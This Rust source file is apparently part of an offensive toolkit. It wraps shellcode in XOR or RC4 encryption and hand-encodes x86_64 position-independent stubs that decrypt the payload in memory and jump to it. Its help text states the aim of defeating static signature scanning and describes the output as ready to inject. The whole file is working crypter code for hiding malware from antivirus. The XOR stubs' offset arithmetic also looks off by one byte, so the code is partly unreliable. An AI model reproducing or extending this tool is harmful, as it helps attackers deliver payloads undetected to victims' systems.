use crate::log::LogSink;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum EncryptMethod {
    XorSingle,
    XorMulti,
    Rc4,
}

impl EncryptMethod {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "xor" | "xorsingle" | "xor-single" => Some(Self::XorSingle),
            "xormulti" | "xor-multi" | "multixor" => Some(Self::XorMulti),
            "rc4" | "arcfour" => Some(Self::Rc4),
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::XorSingle => "XOR (single-byte key)",
            Self::XorMulti => "XOR (multi-byte key)",
            Self::Rc4 => "RC4",
        }
    }

    pub fn all() -> &'static [Self] {
        &[Self::XorSingle, Self::XorMulti, Self::Rc4]
    }
}

#[derive(Debug)]
pub struct EncryptResult {
    pub combined: Vec<u8>,
    pub stub_len: usize,
    pub encrypted_len: usize,
    pub key: Vec<u8>,
    pub method: EncryptMethod,
}

pub fn encrypt(payload: &[u8], method: EncryptMethod, key: &[u8]) -> Result<EncryptResult, String> {
    if payload.is_empty() {
        return Err("payload is empty".to_string());
    }
    if key.is_empty() {
        return Err("encryption key is empty".to_string());
    }

    match method {
        EncryptMethod::XorSingle => {
            if key.len() != 1 {
                return Err(format!(
                    "XOR single-byte mode requires exactly 1 key byte, got {}",
                    key.len()
                ));
            }
            let encrypted = xor_encrypt(payload, key);
            let stub = generate_xor_single_stub(key[0], payload.len());
            let stub_len = stub.len();
            let encrypted_len = encrypted.len();
            let mut combined = stub;
            combined.extend_from_slice(&encrypted);
            Ok(EncryptResult {
                combined,
                stub_len,
                encrypted_len,
                key: key.to_vec(),
                method,
            })
        }
        EncryptMethod::XorMulti => {
            if key.len() > 32 {
                return Err(format!(
                    "XOR multi-byte key max 32 bytes, got {}",
                    key.len()
                ));
            }
            let encrypted = xor_encrypt(payload, key);
            let stub = generate_xor_multi_stub(key, payload.len());
            let stub_len = stub.len();
            let encrypted_len = encrypted.len();
            let mut combined = stub;
            combined.extend_from_slice(&encrypted);
            Ok(EncryptResult {
                combined,
                stub_len,
                encrypted_len,
                key: key.to_vec(),
                method,
            })
        }
        EncryptMethod::Rc4 => {
            if key.len() > 256 {
                return Err(format!("RC4 key max 256 bytes, got {}", key.len()));
            }
            let encrypted = rc4_crypt(payload, key);
            let stub = generate_rc4_stub(key, payload.len());
            let stub_len = stub.len();
            let encrypted_len = encrypted.len();
            let mut combined = stub;
            combined.extend_from_slice(&encrypted);
            Ok(EncryptResult {
                combined,
                stub_len,
                encrypted_len,
                key: key.to_vec(),
                method,
            })
        }
    }
}

pub fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect()
}

pub fn rc4_crypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut s: [u8; 256] = core::array::from_fn(|i| i as u8);
    let mut j: u8 = 0;
    for i in 0..256 {
        j = j
            .wrapping_add(s[i])
            .wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }
    let mut i: u8 = 0;
    j = 0;
    data.iter()
        .map(|&b| {
            i = i.wrapping_add(1);
            j = j.wrapping_add(s[i as usize]);
            s.swap(i as usize, j as usize);
            let k = s[s[i as usize].wrapping_add(s[j as usize]) as usize];
            b ^ k
        })
        .collect()
}

/// XOR single-byte decryption stub (x86_64 PIC)
///
/// Layout: call/pop to find RIP → compute encrypted data address → XOR loop → jmp to decrypted
fn generate_xor_single_stub(key_byte: u8, payload_len: usize) -> Vec<u8> {
    let mut stub = Vec::new();

    // call $+5 (call next instruction to push RIP)
    stub.push(0xE8); // E8 00 00 00 00
    stub.extend_from_slice(&0i32.to_le_bytes());

    // pop rsi — rsi = address of this pop instruction
    stub.push(0x5E);

    // We need to skip from here (offset 6) to the end of the stub.
    // stub total = 6 (call+pop) + 7 (add rsi) + 10 (mov rcx) + 4 (xor loop) + 2 (sub rsi) + 2 (jmp rsi) = ~31
    // But we compute the offset after building the stub, so use a placeholder.

    // add rsi, <offset_to_encrypted_data>  — 48 81 C6 xx xx xx xx
    let add_rsi_pos = stub.len();
    stub.push(0x48);
    stub.push(0x81);
    stub.push(0xC6);
    stub.extend_from_slice(&0u32.to_le_bytes()); // placeholder, patched below

    // mov rcx, <payload_len>  — 48 B9 xx xx xx xx xx xx xx xx
    stub.push(0x48);
    stub.push(0xB9);
    stub.extend_from_slice(&(payload_len as u64).to_le_bytes());

    // xor_loop:
    let loop_start = stub.len();
    // xor byte [rsi], key_byte  — 80 36 xx
    stub.push(0x80);
    stub.push(0x36);
    stub.push(key_byte);
    // inc rsi — 48 FF C6
    stub.push(0x48);
    stub.push(0xFF);
    stub.push(0xC6);
    // dec rcx — 48 FF C9
    stub.push(0x48);
    stub.push(0xFF);
    stub.push(0xC9);
    // jnz xor_loop — 75 xx
    let jnz_target = loop_start as i8 - (stub.len() as i8 + 2);
    stub.push(0x75);
    stub.push(jnz_target as u8);

    // sub rsi, <payload_len>  — 48 81 EE xx xx xx xx
    stub.push(0x48);
    stub.push(0x81);
    stub.push(0xEE);
    stub.extend_from_slice(&(payload_len as u32).to_le_bytes());

    // jmp rsi — FF E6
    stub.push(0xFF);
    stub.push(0xE6);

    // Patch the add rsi offset: from pop rsi (offset 6) to end of stub
    let offset_to_data = (stub.len() - 6) as u32;
    let patch_bytes = offset_to_data.to_le_bytes();
    stub[add_rsi_pos + 3] = patch_bytes[0];
    stub[add_rsi_pos + 4] = patch_bytes[1];
    stub[add_rsi_pos + 5] = patch_bytes[2];
    stub[add_rsi_pos + 6] = patch_bytes[3];

    stub
}

/// XOR multi-byte decryption stub (x86_64 PIC)
///
/// Embeds the key after the loop, uses a key index register
fn generate_xor_multi_stub(key: &[u8], payload_len: usize) -> Vec<u8> {
    let mut stub = Vec::new();

    // call $+5; pop rsi
    stub.push(0xE8);
    stub.extend_from_slice(&0i32.to_le_bytes());
    stub.push(0x5E);

    // add rsi, <offset_to_encrypted_data> — 48 81 C6 xx xx xx xx
    let add_rsi_pos = stub.len();
    stub.push(0x48);
    stub.push(0x81);
    stub.push(0xC6);
    stub.extend_from_slice(&0u32.to_le_bytes());

    // mov rcx, <payload_len>
    stub.push(0x48);
    stub.push(0xB9);
    stub.extend_from_slice(&(payload_len as u64).to_le_bytes());

    // lea rdi, [rip + <offset_to_key_data>]  — 48 8D 3D xx xx xx xx
    let lea_rdi_pos = stub.len();
    stub.push(0x48);
    stub.push(0x8D);
    stub.push(0x3D);
    stub.extend_from_slice(&0i32.to_le_bytes());

    // xor rdx, rdx — key index = 0 — 48 31 D2
    stub.push(0x48);
    stub.push(0x31);
    stub.push(0xD2);

    // xor_loop:
    let loop_start = stub.len();
    // movzx eax, byte [rdi + rdx] — 0F B6 04 17
    stub.push(0x0F);
    stub.push(0xB6);
    stub.push(0x04);
    stub.push(0x17);
    // xor byte [rsi], al — 30 06
    stub.push(0x30);
    stub.push(0x06);
    // inc rsi — 48 FF C6
    stub.push(0x48);
    stub.push(0xFF);
    stub.push(0xC6);
    // inc rdx — 48 FF C2
    stub.push(0x48);
    stub.push(0xFF);
    stub.push(0xC2);
    // cmp rdx, <key_len> — 48 81 FA xx xx xx xx
    stub.push(0x48);
    stub.push(0x81);
    stub.push(0xFA);
    stub.extend_from_slice(&(key.len() as u32).to_le_bytes());
    // jb skip_reset — 72 03
    stub.push(0x72);
    stub.push(0x03);
    // xor rdx, rdx — 48 31 D2
    stub.push(0x48);
    stub.push(0x31);
    stub.push(0xD2);
    // dec rcx — 48 FF C9
    stub.push(0x48);
    stub.push(0xFF);
    stub.push(0xC9);
    // jnz xor_loop
    let jnz_target = loop_start as i8 - (stub.len() as i8 + 2);
    stub.push(0x75);
    stub.push(jnz_target as u8);

    // sub rsi, <payload_len>
    stub.push(0x48);
    stub.push(0x81);
    stub.push(0xEE);
    stub.extend_from_slice(&(payload_len as u32).to_le_bytes());

    // jmp rsi
    stub.push(0xFF);
    stub.push(0xE6);

    // Key data embedded here
    let key_data_offset = stub.len();
    stub.extend_from_slice(key);

    // Patch add rsi offset: from pop rsi (offset 6) to end of stub (after key data)
    let offset_to_data = (stub.len() - 6) as u32;
    let patch_bytes = offset_to_data.to_le_bytes();
    stub[add_rsi_pos + 3] = patch_bytes[0];
    stub[add_rsi_pos + 4] = patch_bytes[1];
    stub[add_rsi_pos + 5] = patch_bytes[2];
    stub[add_rsi_pos + 6] = patch_bytes[3];

    // Patch lea rdi: RIP-relative offset from end of lea instruction to key data
    let lea_end = lea_rdi_pos + 7;
    let key_rel = (key_data_offset as i32) - (lea_end as i32);
    let key_rel_bytes = key_rel.to_le_bytes();
    stub[lea_rdi_pos + 3] = key_rel_bytes[0];
    stub[lea_rdi_pos + 4] = key_rel_bytes[1];
    stub[lea_rdi_pos + 5] = key_rel_bytes[2];
    stub[lea_rdi_pos + 6] = key_rel_bytes[3];

    stub
}

/// RC4 decryption stub (x86_64 PIC)
///
/// Allocates 256-byte S-box on stack, runs KSA, then PRGA to decrypt in-place
fn generate_rc4_stub(key: &[u8], payload_len: usize) -> Vec<u8> {
    let mut stub = Vec::new();

    // Prologue: save registers, allocate stack for S-box (256 bytes) + alignment
    // push rbx; push rbp; push rdi; push rsi; push r12; push r13; push r14; push r15
    stub.extend_from_slice(&[0x53, 0x55, 0x57, 0x56]);
    stub.extend_from_slice(&[0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57]);

    // sub rsp, 0x120 — allocate 288 bytes (256 for S-box + 32 shadow space)
    stub.push(0x48);
    stub.push(0x81);
    stub.push(0xEC);
    stub.extend_from_slice(&0x120u32.to_le_bytes());

    // call $+5; pop rbx — get RIP
    stub.push(0xE8);
    stub.extend_from_slice(&0i32.to_le_bytes());
    stub.push(0x5B);

    // Save payload pointer in r12 (will be computed later)
    // lea r12, [rbx + <offset_to_encrypted>] — 4C 8D A3 xx xx xx xx
    let lea_r12_pos = stub.len();
    stub.extend_from_slice(&[0x4C, 0x8D, 0xA3]);
    stub.extend_from_slice(&0i32.to_le_bytes());

    // Save key pointer in r13
    // lea r13, [rbx + <offset_to_key>] — 4C 8D AB xx xx xx xx
    let lea_r13_pos = stub.len();
    stub.extend_from_slice(&[0x4C, 0x8D, 0xAB]);
    stub.extend_from_slice(&0i32.to_le_bytes());

    // mov r14d, <payload_len> — 41 BE xx xx xx xx
    stub.extend_from_slice(&[0x41, 0xBE]);
    stub.extend_from_slice(&(payload_len as u32).to_le_bytes());

    // mov r15d, <key_len> — 41 BF xx xx xx xx
    stub.extend_from_slice(&[0x41, 0xBF]);
    stub.extend_from_slice(&(key.len() as u32).to_le_bytes());

    // lea rdi, [rsp] — S-box base — 48 8D 3C 24
    stub.extend_from_slice(&[0x48, 0x8D, 0x3C, 0x24]);

    // === KSA: Initialize S-box ===
    // for i in 0..256: S[i] = i
    // xor ecx, ecx — 31 C9
    stub.extend_from_slice(&[0x31, 0xC9]);
    // init_loop:
    let init_loop = stub.len();
    // mov byte [rdi + rcx], cl — 88 0C 0F
    stub.extend_from_slice(&[0x88, 0x0C, 0x0F]);
    // inc ecx — FF C1
    stub.extend_from_slice(&[0xFF, 0xC1]);
    // cmp ecx, 256 — 81 F9 00 01 00 00
    stub.extend_from_slice(&[0x81, 0xF9, 0x00, 0x01, 0x00, 0x00]);
    // jb init_loop
    let rel = init_loop as i8 - (stub.len() as i8 + 2);
    stub.push(0x72);
    stub.push(rel as u8);

    // KSA shuffle:
    // xor ecx, ecx (i=0); xor edx, edx (j=0)
    stub.extend_from_slice(&[0x31, 0xC9, 0x31, 0xD2]);
    // ksa_loop:
    let ksa_loop = stub.len();
    // movzx eax, byte [rdi + rcx] — 0F B6 04 0F
    stub.extend_from_slice(&[0x0F, 0xB6, 0x04, 0x0F]);
    // add dl, al — 00 C2
    stub.extend_from_slice(&[0x00, 0xC2]);
    // --- compute i % key_len for key[i % key_len] ---
    // push rcx; push rdx
    stub.extend_from_slice(&[0x51, 0x52]);
    // mov eax, ecx — 89 C8
    stub.extend_from_slice(&[0x89, 0xC8]);
    // xor edx, edx — 31 D2
    stub.extend_from_slice(&[0x31, 0xD2]);
    // div r15d — 41 F7 F7
    stub.extend_from_slice(&[0x41, 0xF7, 0xF7]);
    // movzx eax, byte [r13 + rdx] — 41 0F B6 44 15 00
    stub.extend_from_slice(&[0x41, 0x0F, 0xB6, 0x44, 0x15, 0x00]);
    // pop rdx; pop rcx
    stub.extend_from_slice(&[0x5A, 0x59]);
    // add dl, al — 00 C2
    stub.extend_from_slice(&[0x00, 0xC2]);
    // swap S[i] and S[j]:
    // movzx eax, byte [rdi + rcx] — 0F B6 04 0F
    stub.extend_from_slice(&[0x0F, 0xB6, 0x04, 0x0F]);
    // movzx ebx, dl — 0F B6 DA  (use ebx as extended j)
    stub.extend_from_slice(&[0x0F, 0xB6, 0xDA]);
    // movzx ebp, byte [rdi + rbx] — 0F B6 2C 1F
    stub.extend_from_slice(&[0x0F, 0xB6, 0x2C, 0x1F]);
    // mov byte [rdi + rcx], bpl — 40 88 2C 0F
    stub.extend_from_slice(&[0x40, 0x88, 0x2C, 0x0F]);
    // mov byte [rdi + rbx], al — 88 04 1F
    stub.extend_from_slice(&[0x88, 0x04, 0x1F]);
    // inc ecx — FF C1
    stub.extend_from_slice(&[0xFF, 0xC1]);
    // cmp ecx, 256
    stub.extend_from_slice(&[0x81, 0xF9, 0x00, 0x01, 0x00, 0x00]);
    // jb ksa_loop
    let rel = ksa_loop as i8 - (stub.len() as i8 + 2);
    stub.push(0x72);
    stub.push(rel as u8);

    // === PRGA: decrypt payload ===
    // xor ecx, ecx (i=0); xor edx, edx (j=0); xor esi, esi (counter)
    stub.extend_from_slice(&[0x31, 0xC9, 0x31, 0xD2, 0x31, 0xF6]);
    // prga_loop:
    let prga_loop = stub.len();
    // inc cl — FE C1
    stub.extend_from_slice(&[0xFE, 0xC1]);
    // movzx eax, byte [rdi + rcx] — 0F B6 04 0F
    stub.extend_from_slice(&[0x0F, 0xB6, 0x04, 0x0F]);
    // add dl, al — 00 C2
    stub.extend_from_slice(&[0x00, 0xC2]);
    // swap S[i], S[j]
    stub.extend_from_slice(&[0x0F, 0xB6, 0xDA]); // movzx ebx, dl
    stub.extend_from_slice(&[0x0F, 0xB6, 0x2C, 0x1F]); // movzx ebp, byte [rdi + rbx]
    stub.extend_from_slice(&[0x40, 0x88, 0x2C, 0x0F]); // mov [rdi+rcx], bpl
    stub.extend_from_slice(&[0x88, 0x04, 0x1F]); // mov [rdi+rbx], al
    // k = S[(S[i] + S[j]) & 0xFF]
    // movzx eax, byte [rdi + rcx] — 0F B6 04 0F
    stub.extend_from_slice(&[0x0F, 0xB6, 0x04, 0x0F]);
    // add al, bpl — 40 00 E8
    stub.extend_from_slice(&[0x40, 0x00, 0xE8]);
    // movzx eax, al — 0F B6 C0
    stub.extend_from_slice(&[0x0F, 0xB6, 0xC0]);
    // movzx eax, byte [rdi + rax] — 0F B6 04 07
    stub.extend_from_slice(&[0x0F, 0xB6, 0x04, 0x07]);
    // xor byte [r12 + rsi], al — 41 30 04 34
    stub.extend_from_slice(&[0x41, 0x30, 0x04, 0x34]);
    // inc esi — FF C6
    stub.extend_from_slice(&[0xFF, 0xC6]);
    // cmp esi, r14d — 41 39 F6
    stub.extend_from_slice(&[0x41, 0x39, 0xF6]);
    // jb prga_loop
    let rel = prga_loop as i8 - (stub.len() as i8 + 2);
    stub.push(0x72);
    stub.push(rel as u8);

    // Epilogue: restore stack, jump to decrypted payload
    // add rsp, 0x120
    stub.push(0x48);
    stub.push(0x81);
    stub.push(0xC4);
    stub.extend_from_slice(&0x120u32.to_le_bytes());

    // pop r15; pop r14; pop r13; pop r12; pop rsi; pop rdi; pop rbp; pop rbx
    stub.extend_from_slice(&[0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C]);
    stub.extend_from_slice(&[0x5E, 0x5F, 0x5D, 0x5B]);

    // jmp r12 — 41 FF E4
    stub.extend_from_slice(&[0x41, 0xFF, 0xE4]);

    // Key data embedded here
    let key_data_offset = stub.len();
    stub.extend_from_slice(key);

    // Calculate the pop rbx position (where call $+5 lands): find it
    // call $+5 is at byte index after prologue (12 bytes push + 7 bytes sub rsp = 19)
    // pop rbx is at index 24 (19 + 5 for call)
    let pop_rbx_pos = 19 + 5; // 24

    // Patch lea r12 (payload pointer): offset from pop rbx to end of stub+key (where encrypted data follows)
    let r12_rel = (stub.len() as i32) - (pop_rbx_pos as i32);
    let r12_bytes = r12_rel.to_le_bytes();
    stub[lea_r12_pos + 3] = r12_bytes[0];
    stub[lea_r12_pos + 4] = r12_bytes[1];
    stub[lea_r12_pos + 5] = r12_bytes[2];
    stub[lea_r12_pos + 6] = r12_bytes[3];

    // Patch lea r13 (key pointer): offset from pop rbx to key data
    let r13_rel = (key_data_offset as i32) - (pop_rbx_pos as i32);
    let r13_bytes = r13_rel.to_le_bytes();
    stub[lea_r13_pos + 3] = r13_bytes[0];
    stub[lea_r13_pos + 4] = r13_bytes[1];
    stub[lea_r13_pos + 5] = r13_bytes[2];
    stub[lea_r13_pos + 6] = r13_bytes[3];

    stub
}

pub fn print_info(log: &LogSink) {
    log.info("=== Shellcode Encryption ===".to_string());
    log.info(String::new());
    log.detail("Wraps shellcode with an encryption layer to defeat static".to_string());
    log.detail("signature scanning. Output is a PIC decryption stub followed".to_string());
    log.detail("by the encrypted payload.".to_string());
    log.info(String::new());
    log.detail("Methods:".to_string());
    log.detail("  XOR (single-byte) — fastest, simplest; key is 1 byte".to_string());
    log.detail("  XOR (multi-byte)  — stronger; key up to 32 bytes".to_string());
    log.detail("  RC4               — stream cipher; key up to 256 bytes".to_string());
    log.info(String::new());
    log.detail("At runtime the stub decrypts the payload in-place, then".to_string());
    log.detail("jumps to the decrypted code. No external dependencies.".to_string());
    log.detail("The stub + encrypted payload is a valid PIC shellcode blob.".to_string());
}

pub fn dry_run(method: &str, key_desc: &str, log: &LogSink) {
    let m = EncryptMethod::from_str(method).map_or(method, |m| m.name());
    log.info(format!("[DRY RUN] Shellcode Encryption — {m}"));
    log.detail(format!("  Method: {m}"));
    log.detail(format!("  Key: {key_desc}"));
    log.detail("  Steps:".to_string());
    log.detail("    1. Read payload bytes".to_string());
    log.detail("    2. Encrypt with chosen method".to_string());
    log.detail("    3. Generate PIC x86_64 decryption stub".to_string());
    log.detail("    4. Output: stub + encrypted_payload (ready to inject)".to_string());
}
